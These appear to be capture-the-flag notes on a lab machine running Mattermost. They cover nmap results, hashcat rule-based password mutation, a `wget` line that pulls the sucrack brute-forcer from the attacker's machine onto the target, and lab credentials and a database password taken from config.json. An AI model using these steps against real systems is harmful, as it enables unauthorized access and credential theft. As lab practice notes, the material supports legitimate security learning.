https://www.youtube.com/watch?v=gbs43E71mFM

## Main points

- Using **hashcat** to create a list of variants of a known password: `hashcat --stdout <filename> -r /usr/share/hashcat/rules/best64.rule`. https://hashcat.net/wiki/doku.php?id=rule_based_attack
- Using **sucrack** after uploading to server with `wget <mymachine>/sucrack && wget <mymachine>/pwdlist`. sucrack is a multithreaded Linux/UNIX tool for brute-force cracking local user accounts via su. This tool comes in handy as final instance on a system where you have not too many privileges but are in the wheel group. Many su implementations require a pseudo terminal to be attached in order to take the password from the user. This is why you couldn't just use a simple shell script and pipe the password from STDIN. This tool, written in C, is highly efficient and can attempt multiple logins at the same time. Please be advised that using this tool will take a lot of the CPU performance and fill up the logs quite quickly.
  
## Enumeration

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
PORT     STATE SERVICE VERSION                                                                                                                                                                 
8065/tcp open  unknown                                                                                                                                                                         
| fingerprint-strings:                                                                                                                                                                         
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:                                                                                                                      
|     HTTP/1.1 400 Bad Request                                                                                                                                                                 
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                  
|     Connection: close                                                                                                                                                                        
|     Request                                                                                                                                                                                  
|   GetRequest:                                                                                                                                                                                
|     HTTP/1.0 200 OK                                                                                                                                                                          
|     Accept-Ranges: bytes                                                                                                                                                                     
|     Cache-Control: no-cache, max-age=31556926, public                                                                                                                                        
|     Content-Length: 3108                                                                                                                                                                     
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com                                                                                                    
|     Content-Type: text/html; charset=utf-8                                                                                                                                                   
|     Last-Modified: Tue, 18 Jul 2023 05:18:58 GMT                                                                                                                                             
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: 1jtt31szpbbh9xnuwskyjf69dy
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Tue, 18 Jul 2023 21:14:06 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Tue, 18 Jul 2023 21:14:07 GMT
|_    Content-Length: 0

```

```
[*] Service 22/tcp is ssh running OpenSSH version 7.9p1 Debian 10+deb10u2
[*] Service 80/tcp is http running nginx version 1.14.2
```

Credentials to the server are maildeliverer:Youve_G0t_Mail!
PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.

Search for Mattermost files on the server reveled a config.json file with DB password:

```
"SqlSettings": {                                                                                                                                                                           
        "DriverName": "mysql",                                                                 
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],                                                              
        "DataSourceSearchReplicas": [],                                                        
        "MaxIdleConns": 20,                                                                    
        "ConnMaxLifetimeMilliseconds": 3600000,                                                
        "MaxOpenConns": 300,                                                                   
        "Trace": false,                                                                        
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",                                
        "QueryTimeout": 30,                                                                    
        "DisableDatabaseSearch": false                                                         
    },
```